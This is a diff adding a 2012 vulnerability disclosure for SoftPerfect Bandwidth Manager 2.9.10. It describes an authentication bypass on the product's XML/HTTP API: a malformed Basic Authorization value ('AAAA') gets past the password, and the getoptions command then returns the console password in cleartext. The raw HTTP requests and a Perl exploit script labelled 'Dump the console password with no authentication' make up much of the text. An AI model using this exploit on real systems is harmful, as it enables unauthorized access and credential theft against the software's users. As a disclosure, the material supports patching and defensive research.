@@ -1,0 +1,64 @@
+Authentication Bypass and Password disclosure.
+
+SoftPerfect Bandwidth Manager Authentication Bypass
+*Date:* 22-June-2012
+*Author:* Gitsnik http://dracyrys.com/softperfect
+*Vendor Homepage:* http://www.softperfect.com/
+*Software Link:* http://www.softperfect.com/products/bandwidth/
+*Version:* 2.9.10 (probably all up to this version)
+*Tested on:* Windows 7 Ultimate, Windows Server 2003, Windows Server 2003
+R2.
+
+A vulnerability exists in the authentication processing module of the
+SoftPerfect Bandwidth Manager. According to the SoftPerfect FAQ page the
+system utilises an API consisting of HTTP and XML. Using a packet sniffer
+to monitor port 8701 we can see that the initial packet exchange for a
+blank password is:
+
+POST / HTTP/1.0Content-Type: text/xmlContent-Length: 100Authorization:
+Basic YWRtaW46
+<?xml version="1.0" encoding="windows-1252"?><request>
+<command>getoptions</command>
+</request>
+
+Basic authentication with a username of admin and a blank password.
+
+When this software has no password set, any password seems to authenticate.
+This is interesting, but ultimately unusual in a proper environment.
+
+The bug exists in the authentication mechanism. I was initially going to
+fuzz the Basic string, only to find that it worked on my first try. Sending
+the following to the application will completely bypass any password in
+place (note the strong text in the Authorization line):
+
+POST / HTTP/1.0Content-Type: text/xmlContent-Length: 100Authorization:
+Basic *AAAA*
+<?xml version="1.0" encoding="windows-1252"?><request>
+<command>getoptions</command>
+</request>
+
+The getoptions command includes dumping a cleartext password from the
+database to the connection.
+Exploit: Dump the console password with no authentication
+
+#!/usr/bin/env perl
+
+use strict;
+use warnings;
+
+my $credentials = "AAAA";
+
+#command: getrules 98
+#command: getoptions 100
+
+my $header = "POST / HTTP/1.0\r\n" .
+	"Content-Type: text/xml\r\n" .
+	"Content-Length: 100\r\n" .
+	"Authorization: Basic $credentials\r\n" .
+	"\r\n" .
+	"<?xml version=\"1.0\" encoding=\"windows-1252\"?>\r\n" .
+	"<request>\r\n" .
+	"\t<command>getoptions</command>\r\n" .
+	"</request>";
+
+print $header;
